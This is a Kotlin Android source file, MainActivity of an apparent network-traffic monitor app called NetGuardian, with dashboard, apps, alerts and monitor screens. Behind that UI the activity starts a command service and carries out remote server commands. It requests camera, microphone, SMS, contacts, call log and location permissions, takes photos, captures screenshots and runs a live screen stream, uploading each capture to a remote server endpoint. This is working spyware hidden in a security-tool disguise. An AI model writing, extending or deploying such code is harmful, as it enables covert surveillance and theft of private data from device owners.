package net.guardian

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.Manifest
import android.content.pm.PackageManager
import android.graphics.*
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Bundle
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.DisplayMetrics
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.core.content.FileProvider
import androidx.compose.foundation.layout.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.List
import androidx.compose.material.icons.filled.Home
import androidx.compose.material.icons.filled.Favorite
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import net.guardian.data.TrafficDatabase
import net.guardian.ui.alerts.AlertsScreen
import net.guardian.ui.apps.AppTrafficItem
import net.guardian.ui.apps.AppsScreen
import net.guardian.ui.dashboard.DashboardScreen
import net.guardian.ui.dashboard.DashboardViewModel
import net.guardian.ui.monitor.MonitorScreen
import net.guardian.ui.monitor.captureScreenshot
import net.guardian.ui.theme.NetGuardianTheme
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer

class MainActivity : ComponentActivity() {

    companion object {
        var screenProjection: MediaProjection? = null
        var screenVirtualDisplay: VirtualDisplay? = null
        var screenReader: ImageReader? = null
        var isScreenStreaming = false
        var screenStreamJob: Job? = null
    }

    private lateinit var database: TrafficDatabase
    private lateinit var viewModel: DashboardViewModel

    private var capturePhotoFile: File? = null
    private var pendingCommandId: Int? = null
    private var pendingScreenStream = false

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { }

    private fun ackCommand(success: Boolean, msg: String = "ok") {
        pendingCommandId?.let { id ->
            kotlinx.coroutines.MainScope().launch {
                withContext(Dispatchers.IO) {
                    ServerUploader.ackCommand(id, if (success) "done" else "failed", msg)
                }
            }
        }
        pendingCommandId = null
    }

    private val cameraCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.TakePicture()
    ) { success ->
        if (success) {
            capturePhotoFile?.let { file ->
                if (file.exists()) {
                    kotlinx.coroutines.MainScope().launch {
                        withContext(Dispatchers.IO) {
                            ServerUploader.uploadCapture("camera", file = file)
                        }
                        ackCommand(true)
                        finish()
                    }
                    return@registerForActivityResult
                }
            }
        }
        ackCommand(false, "no photo")
        finish()
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val projection = mgr.getMediaProjection(result.resultCode, result.data!!)
            if (pendingScreenStream) {
                startScreenStream(projection)
                ackCommand(true)
                pendingScreenStream = false
                finish()
                return@registerForActivityResult
            }
            kotlinx.coroutines.MainScope().launch {
                val file = withContext(Dispatchers.IO) {
                    captureScreenshot(this@MainActivity, projection)
                }
                var uploaded = false
                if (file != null) {
                    uploaded = withContext(Dispatchers.IO) {
                        ServerUploader.uploadCapture("screen", file = file)
                    }
                    file.delete()
                }
                projection.stop()
                ackCommand(uploaded, if (uploaded) "ok" else "capture failed")
                finish()
            }
        } else {
            if (pendingScreenStream) {
                pendingScreenStream = false
                ackCommand(false, "user denied")
            }
            finish()
        }
    }

    private fun launchScreenStream() {
        if (screenProjection != null) {
            startScreenStream(screenProjection!!)
            ackCommand(true, "ok")
            finish()
            return
        }
        pendingScreenStream = true
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
        if (mgr == null) {
            ackCommand(false, "Screen projection not supported")
            finish()
            return
        }
        screenCaptureLauncher.launch(mgr.createScreenCaptureIntent())
    }

    private fun startScreenStream(projection: MediaProjection) {
        stopScreenStream()
        screenProjection = projection

        val metrics = DisplayMetrics().also { windowManager.defaultDisplay.getRealMetrics(it) }
        val density = metrics.densityDpi
        val w = metrics.widthPixels / 2
        val h = metrics.heightPixels / 2

        val ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        screenReader = ir

        val handler = Handler(Looper.getMainLooper())
        val streamScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        ir.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val jpeg = screenImageToJpeg(image)
                image.close()
                if (jpeg != null) {
                    streamScope.launch {
                        uploadScreenFrame(jpeg)
                    }
                }
            } catch (_: Exception) { image.close() }
        }, handler)

        screenVirtualDisplay = projection.createVirtualDisplay(
            "screen-stream",
            w, h, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            ir.surface, null, handler
        )
        isScreenStreaming = true
        screenStreamJob = streamScope.launch {
            while (isActive && isScreenStreaming) {
                try {
                    ServerUploader.uploadScreenFrame("LIVE")
                } catch (_: Exception) { }
                delay(2000)
            }
        }
    }

    private fun stopScreenStream() {
        isScreenStreaming = false
        screenStreamJob?.cancel()
        screenStreamJob = null
        try { screenVirtualDisplay?.release() } catch (_: Exception) { }
        try { screenReader?.close() } catch (_: Exception) { }
        try { screenProjection?.stop() } catch (_: Exception) { }
        screenVirtualDisplay = null
        screenReader = null
        screenProjection = null
    }

    private fun screenImageToJpeg(image: Image): ByteArray? {
        try {
            val w = image.width
            val h = image.height
            val plane = image.planes[0]
            val buf = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val pixels = IntArray(w * h)
            buf.rewind()
            for (y in 0 until h) {
                val row = y * w
                for (x in 0 until w) {
                    val pos = y * rowStride + x * pixelStride
                    val r = buf.get(pos).toInt() and 0xFF
                    val g = buf.get(pos + 1).toInt() and 0xFF
                    val b = buf.get(pos + 2).toInt() and 0xFF
                    val a = buf.get(pos + 3).toInt() and 0xFF
                    pixels[row + x] = a shl 24 or (r shl 16) or (g shl 8) or b
                }
            }
            val bitmap = Bitmap.createBitmap(pixels, w, h, Bitmap.Config.ARGB_8888)
            val out = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
            bitmap.recycle()
            return out.toByteArray()
        } catch (_: Exception) { return null }
    }

    private fun uploadScreenFrame(jpeg: ByteArray) {
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", "frame.jpg",
                jpeg.toRequestBody("image/jpeg".toMediaType()))
            .build()
        val request = Request.Builder()
            .url("${ServerUploader.serverUrl}/api/screen/frame")
            .post(body)
            .build()
        try {
            ServerUploader.sharedClient.newCall(request).execute().use { response ->
                response.body?.close()
            }
        } catch (_: Exception) { }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        database = TrafficDatabase.getDatabase(applicationContext)
        viewModel = DashboardViewModel(database)

        startService(Intent(this, CommandService::class.java))

        handleCommandIntent(intent)

        setContent {
            NetGuardianTheme {
                MainScreen(viewModel, database)
            }
        }
    }

    private fun handleCommandIntent(intent: Intent?) {
        if (intent == null) return

        if (intent.hasExtra("command_id")) {
            pendingCommandId = intent.getIntExtra("command_id", 0)
        }

        intent.getStringExtra("command_permission")?.let { perm ->
            when (perm) {
                "camera" -> launchPermission(Manifest.permission.CAMERA)
                "microphone" -> launchPermission(Manifest.permission.RECORD_AUDIO)
                "contacts" -> launchPermission(Manifest.permission.READ_CONTACTS)
                "sms" -> launchPermission(Manifest.permission.READ_SMS)
                "call_log" -> launchPermission(Manifest.permission.READ_CALL_LOG)
                "gallery" -> {
                    if (Build.VERSION.SDK_INT >= 33)
                        launchPermission(Manifest.permission.READ_MEDIA_IMAGES)
                    else
                        launchPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
                "location" -> {
                    launchPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                    launchPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
                }
            }
        }

        intent.getStringExtra("command_capture")?.let { target ->
            when (target) {
                "camera" -> launchCameraCapture()
                "screen" -> launchScreenCapture()
                "screen_stream_start" -> launchScreenStream()
                "screen_stream_stop" -> {
                    stopScreenStream()
                    ackCommand(true, "ok")
                    finish()
                }
            }
        }
    }

    private fun launchPermission(permission: String) {
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            permissionLauncher.launch(permission)
        }
    }

    private fun launchCameraCapture() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Camera permission not granted", Toast.LENGTH_SHORT).show()
            ackCommand(false, "Camera permission not granted")
            finish()
            return
        }
        val file = File(
            getExternalFilesDir(Environment.DIRECTORY_PICTURES),
            "remote_capture_${System.currentTimeMillis()}.jpg"
        )
        val uri = FileProvider.getUriForFile(this, "${packageName}.fileprovider", file)
        capturePhotoFile = file
        cameraCaptureLauncher.launch(uri)
    }

    private fun launchScreenCapture() {
        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
        if (mgr == null) {
            Toast.makeText(this, "Screen capture not supported", Toast.LENGTH_SHORT).show()
            ackCommand(false, "Screen capture not supported")
            finish()
            return
        }
        screenCaptureLauncher.launch(mgr.createScreenCaptureIntent())
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleCommandIntent(intent)
    }

    override fun onDestroy() {
        stopScreenStream()
        super.onDestroy()
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MainScreen(viewModel: DashboardViewModel, database: TrafficDatabase) {
    var selectedTab by remember { mutableStateOf(0) }
    val alerts by database.trafficDao().getAllAlerts().collectAsState(initial = emptyList())
    val appTraffic by database.trafficDao().getAppTraffic().collectAsState(initial = emptyList())

    Scaffold(
        bottomBar = {
            NavigationBar(
                containerColor = MaterialTheme.colorScheme.surface
            ) {
                NavigationBarItem(
                    selected = selectedTab == 0,
                    onClick = { selectedTab = 0 },
                    icon = { Icon(Icons.Default.Home, contentDescription = null) },
                    label = { Text("Dashboard") }
                )
                NavigationBarItem(
                    selected = selectedTab == 1,
                    onClick = { selectedTab = 1 },
                    icon = { Icon(Icons.AutoMirrored.Filled.List, contentDescription = null) },
                    label = { Text("Apps") }
                )
                NavigationBarItem(
                    selected = selectedTab == 2,
                    onClick = { selectedTab = 2 },
                    icon = {
                        BadgedBox(badge = {
                            if (alerts.isNotEmpty()) {
                                Badge { Text("${alerts.size}") }
                            }
                        }) { Icon(Icons.Default.Warning, contentDescription = null) }
                    },
                    label = { Text("Alerts") }
                )
                NavigationBarItem(
                    selected = selectedTab == 3,
                    onClick = { selectedTab = 3 },
                    icon = { Icon(Icons.Default.Favorite, contentDescription = null) },
                    label = { Text("Monitor") }
                )
            }
        }
    ) { padding ->
        Box(modifier = Modifier.padding(padding)) {
            val activity = LocalContext.current as Activity
            when (selectedTab) {
                0 -> DashboardScreen(viewModel)
                1 -> AppsScreen(
                    apps = appTraffic.map {
                        AppTrafficItem(
                            appName = it.appName,
                            packageName = it.packageName,
                            totalBytes = it.totalBytes,
                            threatCount = alerts.count { a -> a.packageName == it.packageName }
                        )
                    }
                )
                2 -> AlertsScreen(alerts)
                3 -> MonitorScreen(activity)
            }
        }
    }
}
